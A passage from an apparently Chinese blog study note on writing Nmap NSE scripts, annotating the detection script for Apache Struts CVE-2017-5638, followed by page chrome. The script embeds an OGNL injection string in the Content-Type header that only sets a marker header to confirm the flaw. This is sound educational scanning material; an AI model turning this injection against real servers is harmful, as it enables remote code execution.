Vulnerability</span></span><br><span class="line"><span class="comment">-- |     State: VULNERABLE</span></span><br><span class="line"><span class="comment">-- |     IDs:  CVE:CVE-2017-5638</span></span><br><span class="line"><span class="comment">-- |</span></span><br><span class="line"><span class="comment">-- |     Disclosure date: 2017-03-07</span></span><br><span class="line"><span class="comment">-- |     References:</span></span><br><span class="line"><span class="comment">-- |       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-5638</span></span><br><span class="line"><span class="comment">-- |       https://cwiki.apache.org/confluence/display/WW/S2-045</span></span><br><span class="line"><span class="comment">-- |_      http://blog.talosintelligence.com/2017/03/apache-0-day-exploited.html</span></span><br><span class="line"><span class="comment">--</span></span><br><span class="line"><span class="comment">-- @args http-vuln-cve2017-5638.method The HTTP method for the request. The default method is "GET".</span></span><br><span class="line"><span class="comment">-- @args http-vuln-cve2017-5638.path The URL path to request. The default path is "/".</span></span><br><span class="line"></span><br><span class="line">author = <span class="string">"Seth Jackson"</span></span><br><span class="line">license = <span class="string">"Same as Nmap--See https://nmap.org/book/man-legal.html"</span></span><br><span class="line">categories = &#123; <span class="string">"vuln"</span> &#125;</span><br><span class="line"><span class="comment">--[[</span></span><br><span class="line"><span class="comment">这里说一下[license字段](https://nmap.org/book/nse-script-format.html#nse-format-license)。</span></span><br><span class="line"><span class="comment">nmap是一个社区性项目，其中的很多nse脚本都是通过集体的力量来完成的。你可以将编写的脚本进行提交，可能在下一次更新就可以看到你的脚本了。</span></span><br><span class="line"><span class="comment">通过指定license字段可以将脚本进行提交.</span></span><br><span class="line"><span class="comment">license = "Same as Nmap--See https://nmap.org/book/man-legal.html"</span></span><br><span class="line"><span class="comment">license = "Simplified (2-clause) BSD license--See https://nmap.org/svn/docs/licenses/BSD-simplified"</span></span><br><span class="line"><span class="comment">]]</span><span class="comment">--</span></span><br><span class="line"></span><br><span class="line">portrule = shortport.http</span><br><span class="line"><span class="comment">--[[</span></span><br><span class="line"><span class="comment">制定portrule，通过将其直接指定为shortport.http，匹配所有类似http服务的端口，详情见shortport库的http方法</span></span><br><span class="line"><span class="comment">]]</span><span class="comment">--</span></span><br><span class="line"></span><br><span class="line">action = <span class="function"><span class="keyword">function</span><span class="params">(host, port)</span></span></span><br><span class="line">  <span class="comment">-- 制定漏洞报告和存储格式</span></span><br><span class="line">  <span class="keyword">local</span> vuln = &#123;</span><br><span class="line">    title = <span class="string">"Apache Struts Remote Code Execution Vulnerability"</span>,</span><br><span class="line">    <span class="comment">-- 这是强制的字段，状态有（NOT_VULN，LIKELY_VULN，VULN，Dos，和EXPLOIT）</span></span><br><span class="line">    state = vulns.STATE.NOT_VULN,   </span><br><span class="line">    description = <span class="string">[[</span></span><br><span class="line"><span class="string">Apache Struts 2.3.5 - Struts 2.3.31 and Apache Struts 2.5 - Struts 2.5.10 are vulnerable to a Remote Code Execution</span></span><br><span class="line"><span class="string">vulnerability via the Content-Type header.</span></span><br><span class="line"><span class="string">    ]]</span>,</span><br><span class="line">    IDS = &#123;</span><br><span class="line">        CVE = <span class="string">"CVE-2017-5638"</span></span><br><span class="line">    &#125;,</span><br><span class="line">    references = &#123;</span><br><span class="line">        <span class="string">'https://cwiki.apache.org/confluence/display/WW/S2-045'</span>,</span><br><span class="line">        <span class="string">'http://blog.talosintelligence.com/2017/03/apache-0-day-exploited.html'</span></span><br><span class="line">    &#125;,</span><br><span class="line">    dates = &#123;</span><br><span class="line">        disclosure = &#123; year = <span class="string">'2017'</span>, month = <span class="string">'03'</span>, day = <span class="string">'07'</span> &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">-- 创建一个新的报告对象，所需参数为（self，script_name，host，port），返回的值为报告对象</span></span><br><span class="line">  <span class="keyword">local</span> vuln_report = vulns.Report:new(SCRIPT_NAME, host, port)</span><br><span class="line">  <span class="comment">-- stdnse.get_script_args 是用来获取通过--script-args指定的参数选项</span></span><br><span class="line">  <span class="keyword">local</span> method = stdnse.get_script_args(SCRIPT_NAME..<span class="string">".method"</span>) <span class="keyword">or</span> <span class="string">"GET"</span></span><br><span class="line">  <span class="keyword">local</span> <span class="built_in">path</span> = stdnse.get_script_args(SCRIPT_NAME..<span class="string">".path"</span>) <span class="keyword">or</span> <span class="string">"/"</span></span><br><span class="line">  <span class="comment">-- 生成随机字符串，长度为8位。保证payload的随机性。</span></span><br><span class="line">  <span class="keyword">local</span> value = stdnse.generate_random_string(<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">  <span class="comment">-- 编写头部信息中的payload</span></span><br><span class="line">  <span class="keyword">local</span> header = &#123;</span><br><span class="line">    [<span class="string">"Content-Type"</span>] = <span class="built_in">string</span>.<span class="built_in">format</span>(<span class="string">"%%&#123;#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('X-Check-Struts', '%s')&#125;.multipart/form-data"</span>, value)</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">-- 进行发包请求，传入主机名端口，方法，路径以及头部信息</span></span><br><span class="line">  <span class="keyword">local</span> response = http.generic_request(host, port, method, <span class="built_in">path</span>, &#123; header = header &#125;)</span><br><span class="line">  <span class="comment">-- 查看返回包，如果返回包里有东西，状态码为200并且存在X-Check-Struts头部等于所传入的随机值，并设定漏洞模版信息中的状态字段为存在漏洞。</span></span><br><span class="line">  <span class="keyword">if</span> response <span class="keyword">and</span> response.<span class="built_in">status</span> == <span class="number">200</span> <span class="keyword">and</span> response.header[<span class="string">"x-check-struts"</span>] == value <span class="keyword">then</span></span><br><span class="line">    vuln.state = vulns.STATE.VULN</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line">  <span class="comment">-- 报告漏洞信息。</span></span><br><span class="line">  <span class="keyword">return</span> vuln_report:make_output(vuln)</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure></p>
+<p><strong><font color="red">在上边的脚本中需要着重说一下关于漏洞的state：</font></strong><br><a href="https://nmap.org/nsedoc/lib/vulns.html#make_output" target="_blank" rel="noopener">官网中对state的介绍</a><br><strong>漏洞报告信息必须存放在一个表中，每个漏洞必须有其状态，state是在报告模版中必须要指定的一个字段，状态有（NOT_VULN，LIKELY_VULN，VULN，Dos，和EXPLOIT）</strong><br>NOT_VULN：不存在漏洞。<br>LIKELY_VULN：应该存在漏洞，只是做了一个简单的对比，存在一定的误报。<br>VULN：被证实存在漏洞。<br>EXPLOIT：存在漏洞并且已经测试成功。这条状态会自动设置。<br>DoS：存在拒绝服务攻击，状态会被自动设置。</p>
+<blockquote>
+<p>上方NSE脚本中，先将state字段预设置为不存在漏洞。如果存在漏洞再将字段进行修改并将其漏洞信息进行输出。如果不存在那就不存在咯。<br>猜测应该是有一个日志信息，对于不存在此漏洞的目标主机，那日志中的状态自然就是不存在。这块很容易理解的。</p>
+</blockquote>
+<p>还有一点关于nmap并发以及报告的知识点还没学习，先到这里吧。</p>
+<p>nmap和sqlmap的脚本都学习了一番，这种东西如果要熟练的话还是得不断的写，毕竟理解和能写是两码事。</p>
+<p>还不不断学习，提升自己在学习过程中的独立性以及解决问题的能力，就酱。</p>
+<p>一起学习一起进步，祝大家工作顺利门学业有成。</p>
+<h1 id="参阅文章"><a href="#参阅文章" class="headerlink" title="参阅文章"></a>参阅文章</h1><p><strong>漏斗社区</strong><br><a href="http://www.freebuf.com/column/164388.html" target="_blank" rel="noopener">诸神之眼nmap定制化之初识NSE</a><br><a href="http://www.freebuf.com/column/165252.html" target="_blank" rel="noopener">诸神之眼nmap定制化之NSE进阶</a><br><a href="http://www.freebuf.com/column/165849.html" target="_blank" rel="noopener">NSE漏洞审计和渗透脚本的demo</a></p>
+<p><strong>漏洞银行</strong><br><a href="https://www.bugbank.cn/live/view.html?id=109522" target="_blank" rel="noopener">nmap正确烹饪及食用方法</a></p>
+
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <div>
+      
+        
+  <div style="padding: 10px 0; margin: 20px auto; width: 90%; text-align: center;">
+    <div>坚持原创技术分享，您的支持将鼓励我继续创作！</div>
+    <button id="rewardButton" disable="enable" onclick="var qr = document.getElementById('QR'); if (qr.style.display === 'none') {qr.style.display='block';} else {qr.style.display='none'}">
+      <span>赏</span>
+    </button>
+    <div id="QR" style="display: none;">
+      
+        <div id="wechat" style="display: inline-block">
+          <img id="wechat_qr" src="/images/wechat.png" alt="Yokeen WeChat Pay">
+          <p>微信打赏</p>
+        </div>
+      
+      
+        <div id="alipay" style="display: inline-block">
+          <img id="alipay_qr" src="/images/alipay.jpg" alt="Yokeen Alipay">
+          <p>支付宝打赏</p>
+        </div>
+      
+    </div>
+  </div>
+
+
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/tools/" rel="tag"># tools</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2018/04/22/无题/" rel="next" title="Onenote笔记">
+                <i class="fa fa-chevron-left"></i> Onenote笔记
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2018/06/11/Webshell工作原理与免杀/" rel="prev" title="Webshell工作原理与免杀学习">
+                Webshell工作原理与免杀学习 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </article>
+
+
+
+    <div class="post-spread">
+      
+        <!-- JiaThis Button BEGIN -->
+<div class="jiathis_style">
+  <a class="jiathis_button_tsina"></a>
+  <a class="jiathis_button_tqq"></a>
+  <a class="jiathis_button_weixin"></a>
+  <a class="jiathis_button_cqq"></a>
+  <a class="jiathis_button_douban"></a>
+  <a class="jiathis_button_renren"></a>
+  <a class="jiathis_button_qzone"></a>
+  <a class="jiathis_button_kaixin001"></a>
+  <a class="jiathis_button_copy"></a>
+  <a href="http://www.jiathis.com/share" class="jiathis jiathis_txt jiathis_separator jtico jtico_jiathis" target="_blank"></a>
+  <a class="jiathis_counter_style"></a>
+</div>
+<script type="text/javascript">
+  var jiathis_config={
+    hideMore:false
+  }
+</script>
+<script type="text/javascript" src="http://v3.jiathis.com/code/jia.js" charset="utf-8"></script>
+<!-- JiaThis Button END -->
+
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+  <div class="comments" id="comments">
+    
+  </div>
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+          <img class="site-author-image" itemprop="image" src="/images/beiy.jpg" alt="Yokeen">
+          <p class="site-author-name" itemprop="name">Yokeen</p>
+           
+              <p class="site-description motion-element" itemprop="description">无所畏惧，勇往直前</p>
+          
+        </div>
+        <nav class="site-state motion-element">
+
+          
+            <div class="site-state-item site-state-posts">
+              <a href="/archives/">
+                <span class="site-state-item-count">42</span>
+                <span class="site-state-item-name">日志</span>
+              </a>
+            </div>
+          
+
+          
+            
+            
+            <div class="site-state-item site-state-categories">
+              <a href="/categories/index.html">
+                <span class="site-state-item-count">2</span>
+                <span class="site-state-item-name">分类</span>
+              </a>
+            </div>
+          
+
+          
+            
+            
+            <div class="site-state-item site-state-tags">
+              <a href="/tags/index.html">
+                <span class="site-state-item-count">11</span>
+                <span class="site-state-item-name">标签</span>
+              </a>
+            </div>
+          
+
+        </nav>
+
+        
+
+        <div class="links-of-author motion-element">
+          
+            
+              <span class="links-of-author-item">
+                <a href="https://github.com/Yokeen" target="_blank" title="GitHub">
+                  
+                    <i class="fa fa-fw fa-github"></i>
+                  
+                  GitHub
+                </a>
+              </span>
+            
+          
+        </div>
+
+        
+        
+
+        
+        
+          <div class="links-of-blogroll motion-element links-of-blogroll-inline">
+            <div class="links-of-blogroll-title">
+              <i class="fa  fa-fw fa-globe"></i>
+              Links
+            </div>
+            <ul class="links-of-blogroll-list">
+              
+                <li class="links-of-blogroll-item">
+                  <a href="https://www.test404.com" title="Test404'Blog" target="_blank">Test404'Blog</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="http://www.lmxspace.com" title="l1nk3r's blog" target="_blank">l1nk3r's blog</a>
+                </li>
+              
+            </ul>
+          </div>
+        
+
+        
+
+
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#前言"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#NMAP的使用"><span class="nav-number">2.</span> <span class="nav-text">NMAP的使用</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#NMAP端口状态"><span class="nav-number">2.1.</span> <span class="nav-text">NMAP端口状态</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#TCP标志位"><span class="nav-number">2.2.</span> <span class="nav-text">TCP标志位</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#常用命令"><span class="nav-number">2.3.</span> <span class="nav-text">常用命令</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#NSE-Script分析"><span class="nav-number">3.</span> <span class="nav-text">NSE Script分析</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#目录结构"><span class="nav-number">3.1.</span> <span class="nav-text">目录结构</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#lua语言基础"><span class="nav-number">3.2.</span> <span class="nav-text">lua语言基础</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#NSE脚本基本格式"><span class="nav-number">3.3.</span> <span class="nav-text">NSE脚本基本格式</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#NSE脚本中的rule"><span class="nav-number">3.3.1.</span> <span class="nav-text">NSE脚本中的rule</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#NES脚本中的API"><span class="nav-number">3.3.2.</span> <span class="nav-text">NES脚本中的API</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#NSE中的库文件"><span class="nav-number">3.4.</span> <span class="nav-text">NSE中的库文件</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#库文件的编写"><span class="nav-number">3.4.1.</span> <span class="nav-text">库文件的编写</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#NSE-Script编写"><span class="nav-number">4.</span> <span class="nav-text">NSE Script编写</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#利用自有库和自定义库实现MySQL写库"><span class="nav-number">4.1.</span> <span class="nav-text">利用自有库和自定义库实现MySQL写库</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#NSE渗透脚本编写"><span class="nav-number">4.2.</span> <span class="nav-text">NSE渗透脚本编写</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#CVE-2017-10271"><span class="nav-number">4.2.1.</span> <span class="nav-text">CVE-2017-10271</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#http库"><span class="nav-number">4.2.1.1.</span> <span class="nav-text">http库</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#探测脚本编写"><span class="nav-number">4.2.1.2.</span> <span class="nav-text">探测脚本编写</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#CVE-2017-5638-NSE分析"><span class="nav-number">4.2.2.</span> <span class="nav-text">CVE-2017-5638.NSE分析</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#参阅文章"><span class="nav-number">5.</span> <span class="nav-text">参阅文章</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">
+  
+  &copy;  2016 - 
+  <span itemprop="copyrightYear">2018</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Yokeen</span>
+</div>
+
+
+<div class="powered-by">
+  由 <a class="theme-link" href="https://hexo.io">Hexo</a> 强力驱动
+</div>
+
+<div class="theme-info">
+  主题 -
+  <a class="theme-link" href="https://github.com/iissnan/hexo-theme-next">
+    NexT.Mist
+  </a>
+</div>
+
+
+        
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+  <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+
+  
+  <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+
+  
+  <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.1"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.1"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.1"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.1"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.1"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+  <script src="https://cdn1.lncld.net/static/js/av-core-mini-0.6.4.js"></script>
+  <script>AV.initialize("jwmoWLlH6Y6Lhn3O89mgQzzU-gzGzoHsz", "d2eM2PNMsQCyGqPbC5aaIyuz");</script>
+  <script>
+    function showTime(Counter) {
+      var query = new AV.Query(Counter);
+      var entries = [];
+      var $visitors = $(".leancloud_visitors");
+
+      $visitors.each(function () {
+        entries.push( $(this).attr("id").trim() );
+      });
+
+      query.containedIn('url', entries);
+      query.find()
+        .done(function (results) {
+          var COUNT_CONTAINER_REF = '.leancloud-visitors-count';
+
+          if (results.length === 0) {
+            $visitors.find(COUNT_CONTAINER_REF).text(0);
+            return;
+          }
+
+          for (var i = 0; i < results.length; i++) {
+            var item = results[i];
+            var url = item.get('url');
+            var time = item.get('time');
+            var element = document.getElementById(url);
+
+            $(element).find(COUNT_CONTAINER_REF).text(time);
+          }
+          for(var i = 0; i < entries.length; i++) {
+            var url = entries[i];
+            var element = document.getElementById(url);
+            var countSpan = $(element).find(COUNT_CONTAINER_REF);
+            if( countSpan.text() == '') {
+              countSpan.text(0);
+            }
+          }
+        })
+        .fail(function (object, error) {
+          console.log("Error: " + error.code + " " + error.message);
+        });
+    }
+
+    function addCount(Counter) {
+      var $visitors = $(".leancloud_visitors");
+      var url = $visitors.attr('id').trim();
+      var title = $visitors.attr('data-flag-title').trim();
+      var query = new AV.Query(Counter);
+
+      query.equalTo("url", url);
+      query.find({
+        success: function(results) {
+          if (results.length > 0) {
+            var counter = results[0];
+            counter.fetchWhenSave(true);
+            counter.increment("time");
+            counter.save(null, {
+              success: function(counter) {
+                var $element = $(document.getElementById(url));
+                $element.find('.leancloud-visitors-count').text(counter.get('time'));
+              },
+              error: function(counter, error) {
+                console.log('Failed to save Visitor num, with error message: ' + error.message);
+              }
+            });
+          } else {
+            var newcounter = new Counter();
+            /* Set ACL */
+            var acl = new AV.ACL();
+            acl.setPublicReadAccess(true);
+            acl.setPublicWriteAccess(true);
+            newcounter.setACL(acl);
+            /* End Set ACL */
+            newcounter.set("title", title);
+            newcounter.set("url", url);
+            newcounter.set("time", 1);
+            newcounter.save(null, {
+              success: function(newcounter) {
+                var $element = $(document.getElementById(url));
+                $element.find('.leancloud-visitors-count').text(newcounter.get('time'));
+              },
+              error: function(newcounter, error) {
+                console.log('Failed to create');
+              }
+            });
+          }
+        },
+        error: function(error) {
+          console.log('Error:' + error.code + " " + error.message);
+        }
+      });
+    }
+
+    $(function() {
+      var Counter = AV.Object.extend("Counter");
+      if ($('.leancloud_visitors').length == 1) {
+        addCount(Counter);
+      } else if ($('.post-title-link').length > 1) {
+        showTime(Counter);
+      }
+    });
+  </script>
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
